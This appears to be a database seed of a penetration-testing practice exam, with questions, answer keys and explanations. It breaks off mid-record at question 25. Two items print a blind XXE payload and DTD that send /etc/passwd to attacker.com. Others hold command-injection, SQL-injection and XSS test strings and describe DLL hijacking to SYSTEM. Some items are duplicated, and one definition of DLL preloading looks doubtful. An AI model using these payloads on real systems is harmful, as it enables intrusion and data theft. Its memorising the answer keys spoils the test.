db.tests.insertOne({
  "category": "penplus",
  "testId": 8,
  "testName": "Pentest Practice Test #8 (Very Challenging)",
  "xpPerCorrect": 10,
  "questions": [
     {
      "id": 1,
      "question": "You are performing a penetration test and discover a web application that uses client-side JavaScript to enforce input validation and prevent Cross-Site Scripting (XSS). You intercept the HTTP request using Burp Suite, modify the request to include a malicious script, and successfully bypass the client-side validation. The injected script is then executed when another user views the page. What does this demonstrate, and what is the *most accurate* classification of the vulnerability?",
      "options": [
        "The application is vulnerable to Reflected XSS, as the script was reflected back in the response.",
        "The application is vulnerable to Stored XSS, as the script is now persistently stored and affects other users.",
        "The application is vulnerable to DOM-based XSS, as the client-side JavaScript was manipulated.",
        "The application is not vulnerable to XSS, as the initial validation was performed client-side."
      ],
      "correctAnswerIndex": 1,
      "explanation": "The key here is that the injected script affects *other users*. This is the defining characteristic of *Stored XSS* (also known as Persistent XSS). The script has been saved on the server (e.g., in a database, comment section, profile field) and is served to other users. While client-side JavaScript *was* involved initially, bypassing it allowed the attacker to store the script *server-side*. Reflected XSS is only triggered when a user clicks a malicious link or submits a crafted form; it's not stored. DOM-based XSS manipulates the client-side DOM, but in this case, the persistence on the server makes it Stored XSS. The application is *definitely* vulnerable.",
      "examTip": "Stored XSS = Injected script is saved on the server and affects multiple users."
    },
    {
      "id": 2,
      "question": "You are analyzing a compromised Linux server. You find a setuid root binary in a user's home directory.  Further investigation reveals that this binary calls the `system()` function with user-controlled input without any sanitization. What type of vulnerability is MOST likely present, and how could it be exploited?",
      "options":[
        "Cross-Site Scripting (XSS); exploit it by injecting JavaScript code.",
        "Command Injection leading to Privilege Escalation; exploit it by providing shell commands as input to the binary.",
        "SQL Injection (SQLi); exploit it by injecting SQL code.",
        "Denial-of-Service (DoS); exploit it by providing a very long input string."
      ],
      "correctAnswerIndex": 1,
      "explanation": "A setuid root binary runs with root privileges, regardless of who executes it.  If this binary calls `system()` with unsanitized user input, it's vulnerable to command injection.  The user, despite being unprivileged, can execute arbitrary commands *as root* by providing those commands as input to the binary.  This is a direct path to privilege escalation. This is not XSS (client-side web vulnerability), SQLi (database vulnerability), or DoS (though a very long input *might* cause a buffer overflow, command injection is the *primary* vulnerability).",
      "examTip": "Setuid root binary + `system()` with user input = Command Injection and Privilege Escalation."
    },
    {
        "id": 3,
        "question": "Examine the following Apache web server log entries:\n```\n192.168.1.100 - - [30/Aug/2024:09:00:00 -0400] \"GET /index.html HTTP/1.1\" 200 5000 \"-\" \"Mozilla/5.0\"\n192.168.1.100 - - [30/Aug/2024:09:00:01 -0400] \"GET /images/logo.png HTTP/1.1\" 200 1000 \"http://example.com/index.html\" \"Mozilla/5.0\"\n192.168.1.100 - - [30/Aug/2024:09:00:02 -0400] \"GET /admin.php HTTP/1.1\" 404 200 \"-\" \"Mozilla/5.0\"\n192.168.1.100 - - [30/Aug/2024:09:00:03 -0400] \"GET /admin/ HTTP/1.1\" 404 210 \"-\" \"Mozilla/5.0\"\n192.168.1.100 - - [30/Aug/2024:09:00:04 -0400] \"GET /administrator/ HTTP/1.1\" 404 220 \"-\" \"Mozilla/5.0\"\n192.168.1.100 - - [30/Aug/2024:09:00:05 -0400] \"GET /secret.txt HTTP/1.1\" 403 150 \"-\" \"Mozilla/5.0\"\n172.16.0.5 - - [30/Aug/2024:09:00:06 -0400] \"GET /index.html HTTP/1.1\" 200 5000 \"-\" \"Mozilla/5.0\"\n```\nBased SOLELY on these log entries, which of the following statements is MOST accurate and relevant to a penetration tester?",
        "options":[
          "The user at 192.168.1.100 is likely performing a brute-force attack against the web server.",
          "The user at 192.168.1.100 is likely performing reconnaissance, attempting to discover hidden directories or files, and has found a potentially sensitive file (`secret.txt`) that is protected.",
          "The user at 192.168.1.100 is likely performing a successful SQL injection attack.",
          "The user at 172.16.0.5 is attacking the user at 192.168.1.100."
        ],
        "correctAnswerIndex": 1,
        "explanation": "The repeated 404 errors for requests to `/admin.php`, `/admin/`, and `/administrator/` suggest that the user at 192.168.1.100 is trying common administrative paths, indicative of reconnaissance. The 403 Forbidden response for `/secret.txt` indicates that this file exists but is protected from unauthorized access â€“ a valuable finding for a penetration tester. There's no evidence of brute-forcing (repeated attempts to the *same* resource with different credentials), SQL injection (no SQL code in the requests), or an attack between the two IP addresses. The requests from 172.16.0.5 appear to be normal (accessing `index.html`).",
        "examTip": "Multiple 404s on common admin paths = Reconnaissance. 403 = Forbidden (resource exists but is protected)."
    },
     {
      "id": 4,
       "question": "You are performing a penetration test against a network that uses WPA2-Enterprise with 802.1X authentication. You've set up a rogue access point and are attempting to perform a man-in-the-middle attack.  You successfully deauthenticate a legitimate client, but the client does not connect to your rogue AP. What is the MOST likely reason for this, and what would be a reasonable NEXT step to troubleshoot?",
       "options":[
         "The client has a weak password, and you need to crack it.",
         "The client is likely configured to validate the RADIUS server's certificate, and your rogue AP is presenting a different (likely self-signed) certificate.  You should try to obtain a valid certificate for the target domain or try other attack vectors against the 802.1X/EAP configuration.",
         "The client is using a VPN, which prevents the connection.",
         "The client is out of range of your rogue AP."
       ],
       "correctAnswerIndex": 1,
       "explanation": "WPA2-Enterprise, particularly with EAP-TLS or other certificate-based EAP methods, often involves *mutual* authentication. The client verifies the server's (RADIUS server's) certificate.  If your rogue AP presents a different certificate (especially a self-signed one), the client will likely refuse to connect. Obtaining a valid certificate (potentially through social engineering or other attacks) for the target domain, or focusing on other attack vectors against the 802.1X configuration (e.g., targeting weaknesses in the specific EAP method used), would be logical next steps. A weak password is not relevant to the *initial* connection failure in this scenario. A VPN *might* interfere, but certificate validation is a more likely and direct cause. While being out of range is *possible*, the scenario states you successfully *deauthenticated* the client, implying proximity.",
       "examTip": "WPA2-Enterprise MitM often fails due to client-side certificate validation."
    },
    {
        "id": 5,
        "question": "Examine the following Python code snippet:\n```python\nimport sqlite3\n\ndef get_user_data(username):\n    conn = sqlite3.connect('users.db')\n    cursor = conn.cursor()\n    query = f\"SELECT * FROM users WHERE username = '{username}'\"\n    cursor.execute(query)\n    return cursor.fetchone()\n\nuser_input = input(\"Enter username: \")\nuser_data = get_user_data(user_input)\nif user_data:\n    print(user_data)\nelse:\n    print(\"User not found.\")\n```\nWhat is the primary security vulnerability in this code, and how could an attacker exploit it?",
        "options":[
           "Cross-Site Scripting (XSS); an attacker could inject malicious JavaScript code.",
           "SQL Injection (SQLi); an attacker could inject malicious SQL code into the `username` parameter to bypass authentication or extract data from the database.",
           "Cross-Site Request Forgery (CSRF); an attacker could force a user to execute unintended actions.",
           "Denial-of-Service (DoS); an attacker could cause the application to crash by providing a very long input string."
        ],
        "correctAnswerIndex": 1,
        "explanation": "This code is vulnerable to SQL injection. The `get_user_data` function uses an f-string to directly embed the user-provided `username` into the SQL query *without any sanitization or parameterization*. An attacker could provide a malicious value for `username` (e.g., `' OR '1'='1`) to modify the query's logic and potentially retrieve all user data or bypass authentication. This is a classic SQL injection vulnerability. It's not XSS (no HTML/JavaScript context), CSRF (no forced user actions), or DoS (though a very long input *might* cause issues, SQLi is the primary vulnerability).",
        "examTip": "Directly embedding user input into SQL queries using f-strings, string concatenation, or similar = SQL Injection vulnerability."
    },
     {
        "id": 6,
        "question":"You are tasked with testing a web application that heavily relies on JavaScript for its functionality, including handling user input and updating the Document Object Model (DOM). Which type of Cross-Site Scripting (XSS) vulnerability is MOST likely to be present, and what tools and techniques would be MOST effective for finding it?",
        "options":[
          "Stored XSS; use tools like sqlmap.",
          "DOM-based XSS; use a browser's developer tools, a web proxy (like Burp Suite or OWASP ZAP), and specialized DOM XSS scanners, and manually analyze the JavaScript code.",
          "Reflected XSS; use a network sniffer like Wireshark.",
          "Blind XSS; use a time-based SQL injection technique."
        ],
        "correctAnswerIndex": 1,
        "explanation": "When an application uses JavaScript to handle user input and update the DOM *without proper sanitization*, it's often vulnerable to DOM-based XSS.  This type of XSS occurs entirely within the client-side JavaScript, manipulating the DOM in a way that allows attacker-controlled scripts to execute. The *most effective* tools and techniques involve: (1) **Browser's developer tools:** To inspect the DOM, debug JavaScript code, and see how user input is handled. (2) **Web proxy:** To intercept and modify requests and responses, testing different inputs. (3) **Specialized DOM XSS scanners:**  Tools designed to find these specific vulnerabilities. (4) **Manual code analysis:**  Carefully examining the JavaScript code for insecure handling of user input and DOM manipulation is crucial. Stored XSS involves the server storing the malicious script. Reflected XSS involves the script being reflected back in a server response. sqlmap is for SQL injection, and Wireshark is a network sniffer, not directly useful for DOM XSS. Blind XSS is a type of Stored XSS.",
        "examTip": "DOM-based XSS = Client-side JavaScript vulnerability; use browser dev tools, proxy, and manual code analysis."
      },
     {
        "id": 7,
         "question": "You are performing a penetration test against a web application and notice that after a successful login, the application sets a cookie named `sessionid`. However, this cookie does *not* have the `HttpOnly` flag set. What is the primary security risk associated with this missing flag, and how could an attacker potentially exploit it?",
         "options":[
            "The lack of the `HttpOnly` flag allows an attacker to perform a denial-of-service attack.",
            "The lack of the `HttpOnly` flag allows an attacker to access the cookie's value using JavaScript, making it vulnerable to Cross-Site Scripting (XSS) attacks. If an attacker can inject a malicious script, they can steal the session ID and hijack the user's session.",
            "The lack of the `HttpOnly` flag allows an attacker to perform a SQL injection attack.",
            "The lack of the `HttpOnly` flag allows an attacker to perform a cross-site request forgery (CSRF) attack."
         ],
         "correctAnswerIndex": 1,
         "explanation": "The `HttpOnly` flag, when set on a cookie, prevents client-side JavaScript from accessing the cookie's value. If it's *not* set, and an attacker successfully performs a Cross-Site Scripting (XSS) attack (injecting malicious JavaScript), that script *can* access the `sessionid` cookie and send it to the attacker. The attacker can then use this stolen session ID to impersonate the user (session hijacking). The missing flag doesn't directly enable DoS, SQLi, or CSRF attacks.",
         "examTip": "Missing `HttpOnly` cookie flag = Increased XSS risk (session hijacking)."
     },
     {
        "id": 8,
        "question": "You are performing a penetration test and discover a web application that is vulnerable to XML External Entity (XXE) injection. You craft a payload to read the contents of the `/etc/passwd` file on the server. Which of the following XXE payloads is MOST likely to be successful in a *blind* XXE scenario (where you don't directly see the file contents in the response, but need to use an out-of-band technique)?",
        "options":[
          "```xml\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"/etc/passwd\"> ]>\n<foo>&xxe;</foo>\n```",
          "```xml\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n<foo>&xxe;</foo>\n```",
          "```xml\n<!DOCTYPE foo [\n<!ENTITY % xxe SYSTEM \"file:///etc/passwd\">\n<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">\n%dtd;\n%send;\n]>\n<foo/>\n```\nWhere `http://attacker.com/evil.dtd` contains:\n```xml\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % all \"<!ENTITY % send SYSTEM 'http://attacker.com/?data=%file;'>\">\n%all;\n```",
          "```xml\n<!DOCTYPE foo [ <!ENTITY xxe \"test\"> ]>\n<foo>&xxe;</foo>\n```"
        ],
        "correctAnswerIndex": 2,
        "explanation": "In a *blind* XXE scenario, you can't directly see the contents of the included file in the application's response. You need an *out-of-band* technique to exfiltrate the data. Option C demonstrates this.  It uses a combination of parameter entities and an external DTD (`evil.dtd` hosted on the attacker's server) to: 1. Define an entity `%file` that reads `/etc/passwd`. 2. Define an entity `%all` that contains another entity `%send`. 3. `%send` is defined to make an HTTP request to `http://attacker.com/?data=%file;`, effectively sending the contents of `/etc/passwd` to the attacker's server as a URL parameter. Options A and B are for *direct* XXE, where the file contents would be included in the application's response. Option D simply defines and uses a basic entity, not performing any file inclusion.",
        "examTip": "Blind XXE = Requires out-of-band data exfiltration (often using external DTDs)."
     },
     {
        "id": 9,
         "question": "You are analyzing network traffic captured with Wireshark. You want to isolate all HTTP GET requests that contain the string 'password' in the URL. Which of the following Wireshark display filters is MOST appropriate?",
         "options":[
            "http.request.method == \"GET\"",
            "http.request.uri contains \"password\"",
            "tcp.port == 80",
            "http.request.method == \"GET\" && http.request.uri contains \"password\""
         ],
         "correctAnswerIndex": 3,
         "explanation": "The correct filter combines two conditions using the `&&` (AND) operator: `http.request.method == \"GET\"` selects only HTTP GET requests. `http.request.uri contains \"password\"` selects only requests where the URI (which includes the URL) contains the string \"password\". Option A only filters for GET requests, Option B would include requests to other URLs like example.com/passwordreset.php, option C shows all traffic to port 80",
         "examTip": "Wireshark: `http.request.method`, `http.request.uri`, `contains`, `&&` = Filtering HTTP requests."
     },
     {
        "id": 10,
        "question": "Which of the following statements BEST describes the concept of 'zero trust' in network security?",
        "options":[
            "Trusting all internal network traffic by default.",
            "Never trust, always verify.  Assuming that no user or device, whether inside or outside the network perimeter, should be automatically trusted.  Access is granted based on least privilege and continuous verification of identity and device posture.",
            "Trusting all external network traffic by default.",
            "Relying solely on perimeter firewalls for security."
        ],
        "correctAnswerIndex": 1,
        "explanation": "Zero Trust is a security model that assumes no implicit trust, regardless of location (inside or outside the network).  It requires strict identity verification, device posture checking, and least privilege access for every user and device attempting to access resources.  It's the opposite of trusting all internal traffic. It doesn't trust *external* traffic, and it goes far *beyond* perimeter firewalls.",
        "examTip": "Zero Trust = Never trust, always verify; least privilege access."
     },
      {
        "id": 11,
          "question": "You are performing a penetration test against a web application. You suspect that it might be vulnerable to command injection. Which of the following input strings, if used in a vulnerable input field, would be MOST likely to confirm the vulnerability on a Linux-based web server (assuming the application executes system commands without proper sanitization)?",
          "options":[
            "<script>alert('XSS')</script>",
            "'; SELECT * FROM users; --",
            "'; id; --",
            "' OR '1'='1"
          ],
          "correctAnswerIndex": 2,
          "explanation": "`; id; --` is the most likely to confirm command injection on a Linux system. The semicolon (`;`) acts as a command separator in most shells.  `id` is a simple command that prints user and group information. The `--` is a comment indicator in many contexts (including some shells), helping to neutralize any following parts of the original command. If the application is vulnerable, the server will execute the injected `id` command.  `<script>alert('XSS')</script>` tests for XSS (client-side). `'; SELECT * FROM users; --` is SQL injection. `' OR '1'='1` is also SQL injection.",
          "examTip": "Command injection (Linux) test = `; id; --` (or similar OS-specific commands)."
      },
      {
          "id": 12,
          "question":"What is 'DLL preloading'?",
          "options":[
            "A type of social engineering attack.",
            "A technique similar to DLL hijacking, but it exploits the application's *manifest* or configuration to specify a malicious DLL to be loaded *before* the legitimate DLL, even if the legitimate DLL is present in its expected location.",
            "A method for encrypting data within DLL files.",
            "A way to improve the loading speed of DLL files."
          ],
          "correctAnswerIndex": 1,
          "explanation": "DLL preloading, like DLL hijacking, aims to load a malicious DLL. However, instead of relying on search order vulnerabilities, it exploits application configurations or manifests that explicitly specify which DLLs to load.  This can be even more powerful than hijacking, as it doesn't depend on the legitimate DLL being missing or misplaced. It's not a social engineering attack, encryption method, or performance improvement technique.",
          "examTip": "DLL preloading = Exploiting application manifests/configs to load malicious DLLs *before* legitimate ones."
        },
        {
          "id": 13,
            "question": "You are performing a penetration test and have gained access to a low-privilege user account on a Windows system. You want to escalate your privileges. You've discovered a service running with SYSTEM privileges that is configured to load a DLL from a directory where your user account has write access. What is the MOST likely attack you could perform, and what tool could assist you?",
            "options":[
              "Perform a SQL injection attack using sqlmap.",
              "Perform a DLL hijacking attack; you could create a malicious DLL with the same name as the expected DLL, place it in the writable directory, and then restart the service (or wait for it to restart) to load your malicious DLL and execute code with SYSTEM privileges. Tools like Metasploit's `msfvenom` can be used to create malicious DLLs.",
              "Perform a cross-site scripting (XSS) attack using Burp Suite.",
              "Perform a denial-of-service (DoS) attack using hping3."
            ],
            "correctAnswerIndex": 1,
            "explanation": "This scenario describes a classic DLL hijacking attack. The attacker leverages the weak permissions on the directory where the service loads a DLL to replace the legitimate DLL with a malicious one. When the service restarts, it loads the attacker's DLL, which then executes with SYSTEM privileges (because the service runs as SYSTEM). This is a direct path to privilege escalation. `msfvenom` (part of Metasploit) is commonly used to generate malicious DLL payloads. SQL injection, XSS, and DoS are unrelated attack types in this context.",
            "examTip": "Writable directory containing DLL loaded by high-privilege service = DLL hijacking opportunity."
        },
        {
          "id": 14,
          "question": "You are performing a penetration test and have obtained a user's NTLM password hash.  You do *not* have access to the target system, but you have network connectivity. Which of the following attacks is MOST likely to allow you to authenticate to other systems on the network without cracking the hash?",
          "options":[
             "Cross-Site Scripting (XSS)",
             "Pass-the-Hash (PtH)",
             "SQL Injection (SQLi)",
             "Denial-of-Service (DoS)"
          ],
          "correctAnswerIndex": 1,
          "explanation": "Pass-the-Hash (PtH) allows an attacker to authenticate to a Windows system using the NTLM *hash* of a user's password, *without* needing to know the plaintext password. Tools like `pth-winexe` (from the Impacket suite), `smbexec.py`, or Metasploit's `psexec` module can be used to perform PtH attacks. XSS is a web vulnerability, SQLi targets databases, and DoS disrupts service.",
          "examTip": "Pass-the-Hash (PtH) = Authenticate with NTLM hash, not plaintext password."
        },
        {
            "id": 15,
            "question": "What is the key difference between 'Reflected XSS' and 'Stored XSS'?",
            "options":[
             "Reflected XSS is more dangerous than Stored XSS.",
              "Reflected XSS involves the malicious script being reflected off the web server and executed in the user's browser as part of a response to a *specific* request (e.g., clicking a malicious link, submitting a crafted form). Stored XSS (also called Persistent XSS) involves the malicious script being *permanently stored* on the target server (e.g., in a database, comment field, forum post) and served to *every* user who visits the affected page.",
              "Stored XSS is more dangerous than Reflected XSS.",
              "There is no significant difference between Reflected XSS and Stored XSS."
            ],
            "correctAnswerIndex": 1,
            "explanation": "The core difference is where the malicious script resides and how it's delivered. Reflected XSS is *not* persistent; it requires the user to interact with a specifically crafted request. Stored XSS *is* persistent; the script is saved on the server and served to all users who access the affected resource. While Stored XSS is *often* considered more dangerous due to its wider reach and potential for mass exploitation, both types can be severe depending on the context. The statements about one being universally *more* dangerous are oversimplifications.",
            "examTip": "Reflected XSS = Script in response to a specific request; Stored XSS = Script saved on server and served to multiple users."
        },
        {
          "id": 16,
          "question": "Examine the following Nmap command and its (partial) output:\nCommand: `nmap -sV --script ssl-enum-ciphers -p 443 example.com`\nPartial Output:\n```\nPORT    STATE SERVICE  VERSION\n443/tcp open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)\n| ssl-enum-ciphers:\n|   TLSv1.2:\n|     ciphers:\n|       TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (secp256r1) - A\n|       TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (secp256r1) - A\n|       TLS_DHE_RSA_WITH_AES_128_GCM_SHA256 (dh 2048) - A\n|       TLS_DHE_RSA_WITH_AES_256_GCM_SHA384 (dh 2048) - A\n|       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256 (secp256r1) - A\n|       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384 (secp256r1) - A\n|       TLS_DHE_RSA_WITH_AES_128_CBC_SHA256 (dh 2048) - A\n|       TLS_DHE_RSA_WITH_AES_256_CBC_SHA256 (dh 2048) - A\n|       TLS_RSA_WITH_AES_128_GCM_SHA256 (rsa 2048) - A\n|       TLS_RSA_WITH_AES_256_GCM_SHA384 (rsa 2048) - A\n|       TLS_RSA_WITH_AES_128_CBC_SHA256 (rsa 2048) - A\n|       TLS_RSA_WITH_AES_256_CBC_SHA256 (rsa 2048) - A\n|     compressors:\n|       NULL\n|_  least strength: A\n```\nWhat is the primary purpose of this Nmap command, and what information does the output provide?",
          "options":[
             "This command performs a basic port scan to check if port 443 is open.",
             "This command enumerates the SSL/TLS cipher suites supported by the web server on port 443, which is crucial for assessing the cryptographic strength of the HTTPS connection.",
             "This command attempts to exploit known vulnerabilities in the web server's SSL/TLS implementation.",
             "This command attempts to crack the SSL/TLS encryption key used by the web server."
          ],
          "correctAnswerIndex": 1,
          "explanation": "The `nmap -sV --script ssl-enum-ciphers -p 443 example.com` command is specifically designed to enumerate the SSL/TLS cipher suites supported by the web server running on `example.com` on port 443 (HTTPS).  The output shows the supported TLS versions (TLSv1.2 in this case) and the list of cipher suites, along with their key exchange mechanisms (ECDHE, DHE, RSA) and key sizes.  This information is crucial for assessing the strength of the HTTPS configuration.  Weak cipher suites, outdated protocols, or small key sizes could make the connection vulnerable to attacks. This command does *not* attempt to exploit vulnerabilities or crack encryption keys; it's purely for information gathering.",
          "examTip": "Nmap `--script ssl-enum-ciphers` = Enumerate supported SSL/TLS cipher suites."
        },
        {
            "id": 17,
             "question": "Which of the following is a common technique used to bypass a Network Intrusion Detection System (NIDS) or Intrusion Prevention System (IPS)?",
             "options":[
                "Sending very large, unfragmented packets with clearly malicious payloads.",
                "Using techniques like packet fragmentation, IP address spoofing, traffic obfuscation (e.g., encoding, encryption, Unicode variations, inserting NOP sleds), using non-standard ports or protocols, and, in some cases, exploiting vulnerabilities in the NIDS/IPS itself.",
                "Using well-known and easily detectable attack signatures and patterns.",
                "Using the default configuration settings for the NIDS/IPS and ensuring all signatures are enabled."
             ],
             "correctAnswerIndex": 1,
             "explanation": "Evasion techniques aim to make malicious traffic look different from known attack patterns or to bypass filtering rules. Fragmentation, spoofing, obfuscation, encryption, non-standard ports/protocols, and NIDS/IPS exploits can all help achieve this. Using known signatures, large unfragmented packets, and default settings are likely to *trigger* the NIDS/IPS.",
             "examTip": "Fragmentation, spoofing, obfuscation, encryption, non-standard ports/protocols, NIDS/IPS exploits = Evasion techniques."
        },
        {
           "id": 18,
           "question": "You are performing a penetration test against a web application and discover a potential vulnerability. When you submit the following input in a search field: `<img src=x onerror=alert(1)>`, a JavaScript alert box pops up. What type of vulnerability have you confirmed, and what is the *primary* security risk?",
           "options":[
              "SQL injection; risk of unauthorized database access.",
              "Cross-Site Scripting (XSS); risk of executing arbitrary JavaScript code in the context of other users' browsers.",
              "Cross-Site Request Forgery (CSRF); risk of forcing users to perform unintended actions.",
              "Denial-of-Service (DoS); risk of making the website unavailable."
           ],
           "correctAnswerIndex": 1,
           "explanation": "The successful execution of the JavaScript `alert(1)` confirms a Cross-Site Scripting (XSS) vulnerability. The attacker-supplied code (`<img src=x onerror=alert(1)>`) is injected into the web page and executed by the browser. This demonstrates that the application is not properly sanitizing or encoding user input before displaying it. The *primary* risk of XSS is the ability to execute arbitrary JavaScript in the context of other users' browsers, leading to potential cookie theft, session hijacking, website defacement, and other malicious actions. It's not SQL injection (which targets databases), CSRF (which forces unintended actions through legitimate-looking requests), or DoS (which disrupts service).",
           "examTip": "Successful execution of injected JavaScript (e.g., `alert(1)`) = Confirmed XSS."
        },
                {
          "id": 19,
          "question": "What is 'DLL preloading', and how does it differ from 'DLL hijacking'?",
          "options":[
            "DLL preloading and DLL hijacking are the same attack; the terms are interchangeable.",
            "DLL preloading involves exploiting vulnerabilities in the application's manifest or configuration to specify a malicious DLL to be loaded *before* the legitimate DLL, even if the legitimate DLL is present in its expected location. DLL hijacking typically exploits the DLL search order to load a malicious DLL *instead of* a missing or misplaced legitimate DLL.",
            "DLL preloading is a type of social engineering attack, while DLL hijacking is a type of network attack.",
            "DLL preloading is a technique for improving application performance, while DLL hijacking is a technique for encrypting data."
          ],
          "correctAnswerIndex": 1,
          "explanation": "Both DLL preloading and DLL hijacking aim to load a malicious DLL. However, they use different mechanisms. *DLL hijacking* often exploits the Windows DLL search order, placing a malicious DLL in a location that's searched *before* the legitimate DLL's location. *DLL preloading* exploits the application's *configuration* (e.g., its manifest file) to explicitly specify a malicious DLL to be loaded *before* any others, regardless of the search order. Preloading can therefore be more powerful and reliable, as it doesn't depend on a missing or misplaced DLL. They are not social engineering or network attacks in themselves, nor are they related to performance improvement or encryption.",
          "examTip": "DLL hijacking = Exploits search order; DLL preloading = Exploits application configuration."
        },
        {
          "id": 20,
          "question": "You are performing a penetration test of a web application and discover that it is vulnerable to XML External Entity (XXE) injection.  You want to exfiltrate the contents of the `/etc/passwd` file from the Linux server.  Which of the following XXE payloads, and associated technique, is MOST likely to be successful in a *blind* XXE scenario (where you cannot directly see the file contents in the application's response)?",
          "options":[
            "```xml\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n<foo>&xxe;</foo>\n```",
            "```xml\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"/etc/passwd\"> ]>\n<foo>&xxe;</foo>\n```",
            "```xml\n<!DOCTYPE foo [\n<!ENTITY % xxe SYSTEM \"file:///etc/passwd\">\n<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">\n%dtd;\n]>\n<foo/>\n```\nWhere `http://attacker.com/evil.dtd` contains:\n```xml\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % all \"<!ENTITY % send SYSTEM 'http://attacker.com/?data=%file;'>\">\n%all;\n```",
            "```xml\n<!DOCTYPE foo [ <!ENTITY xxe \"some text\"> ]>\n<foo>&xxe;</foo>\n```"
          ],
          "correctAnswerIndex": 2,
          "explanation": "In a *blind* XXE scenario, you can't directly see the output of the included file in the application's response. You need an *out-of-band* technique to exfiltrate the data. Option C demonstrates this. It uses a combination of parameter entities and an external DTD (`evil.dtd` hosted on the attacker's server) to achieve this. The external DTD defines an entity `%file` that reads the content of `/etc/passwd`. Then, it defines another entity `%all`, which in turn defines `%send`.  The `%send` entity is crafted to make an HTTP request to the attacker's server (`http://attacker.com`), including the content of the `%file` entity (which is `/etc/passwd`) as a URL parameter (`data`). Options A and B are typical payloads for *direct* XXE, where the file contents would be included in the application's response, which wouldn't work in a blind scenario. Option D simply defines and uses a basic entity; it doesn't perform any file inclusion or exfiltration.",
          "examTip": "Blind XXE = Requires out-of-band data exfiltration (often using external DTDs and parameter entities)."
        },
        {
            "id":21,
            "question": "What is the primary security risk associated with weak or predictable session management in web applications?",
            "options": [
              "Cross-Site Scripting",
              "Session Hijacking/Prediction",
              "SQL Injection",
              "Denial of Service"
            ],
            "correctAnswerIndex": 1,
            "explanation": "If session IDs are predictable (e.g., sequential, easily guessable) or transmitted insecurely (e.g., in URLs), attackers can hijack existing sessions or predict future session IDs, impersonating legitimate users. While weak session management *could* contribute to other vulnerabilities, session hijacking/prediction is the most *direct* and *primary* risk.",
            "examTip": "Weak/predictable session management = Session hijacking/prediction risk."
        },
        {
            "id": 22,
            "question": "You have gained access to a Linux system.  Which of the following commands would be MOST useful for determining the system's scheduled tasks (cron jobs) for all users?",
            "options":[
              " `ps aux`",
              " `ls -l /etc/cron*` and `for user in $(cut -f1 -d: /etc/passwd); do crontab -u $user -l; done`",
              " `netstat -tulnp`",
              " `cat /etc/passwd`"
            ],
            "correctAnswerIndex": 1,
            "explanation": "Cron jobs are scheduled tasks on Linux. There are system-wide cron jobs (typically in `/etc/cron.d/`, `/etc/cron.daily/`, `/etc/cron.hourly/`, etc.) and user-specific cron jobs.  `ls -l /etc/cron*` will list the system-wide cron directories and files. The command `for user in $(cut -f1 -d: /etc/passwd); do crontab -u $user -l; done` iterates through all users on the system (by parsing `/etc/passwd`) and attempts to list their individual cron jobs using `crontab -l`.  `ps aux` shows running processes, `netstat -tulnp` shows listening network ports, and `cat /etc/passwd` shows user account information (but not their cron jobs).",
            "examTip": "System-wide cron jobs: `/etc/cron*`; User-specific cron jobs: `crontab -l` (per user)."
        },
        {
            "id": 23,
             "question": "Which of the following is a common technique used to bypass Network Access Control (NAC) systems?",
             "options":[
                "Using strong passwords for all user accounts and enabling multi-factor authentication.",
                "MAC spoofing, 802.1X authentication bypass (if vulnerabilities exist), exploiting vulnerabilities in the NAC system itself, or using a VPN to tunnel traffic around the NAC. In some cases, physical access bypass (e.g., connecting directly to an uncontrolled network port) might also be possible.",
                "Enabling HTTPS for all web traffic and using a web application firewall (WAF).",
                "Regularly updating the operating system and all installed software, and patching known vulnerabilities."
             ],
             "correctAnswerIndex": 1,
             "explanation": "NAC systems control network access based on device posture and identity. Bypassing them often involves impersonating an authorized device (MAC spoofing), exploiting weaknesses in the authentication process (802.1X bypass), attacking the NAC system directly, or circumventing the controls entirely (VPN tunneling or physical access). Strong passwords, MFA, HTTPS, WAFs, and updates are good general security practices, but they don't *directly* address NAC bypass.",
             "examTip": "MAC spoofing, 802.1X bypass, NAC exploits, VPN tunneling, physical bypass = NAC bypass techniques."
        },
        {
          "id": 24,
          "question": "What is the primary purpose of using 'hping3' in a penetration test?",
          "options":[
            "To scan for open ports on a target system using a fast and reliable method.",
            "To craft and send custom network packets, allowing for detailed testing of firewalls, intrusion detection/prevention systems, and other network security controls; also, to perform various network reconnaissance and attack techniques (e.g., SYN flooding, port scanning, OS fingerprinting, firewall rule testing).",
            "To analyze network traffic and capture passwords or other sensitive information.",
            "To crack Wi-Fi passwords using a dictionary attack or brute-force attack."
          ],
          "correctAnswerIndex": 1,
          "explanation": "`hping3` is a powerful *packet crafting* tool. It allows you to create and send custom network packets with precise control over headers, flags, and payloads. This is extremely useful for testing network security devices and performing advanced reconnaissance and attack techniques. While it *can* be used for some forms of port scanning, Nmap is generally preferred for that task. It's not primarily a traffic analyzer (like Wireshark) or a Wi-Fi password cracker (like Aircrack-ng).",
          "examTip": "`hping3` = Crafting custom network packets for advanced testing and attacks."
        },
        {
            "id": 25,
            "question": "You are performing a penetration test and discover a web application that is vulnerable to Local File Inclusion (LFI). You are able to read local files, but you want to achieve Remote Code Execution (RCE). Which of the following techniques, combined with the LFI vulnerability, is MOST likely to allow you to achieve RCE on a PHP-based web server?",
            "options":[
              "Injecting JavaScript code into a user input field to perform Cross-Site Scripting (XSS).",
              "Attempting to include a PHP file that contains malicious code, or attempting to leverage the 'php://filter' or 'data://' wrappers (if enabled) to execute PHP code.",
              "Performing a denial-of-service (DoS) attack against the web server.",
              "Attempting to crack user passwords using a brute-force attack."
            ],
            "correctAnswerIndex": 1,
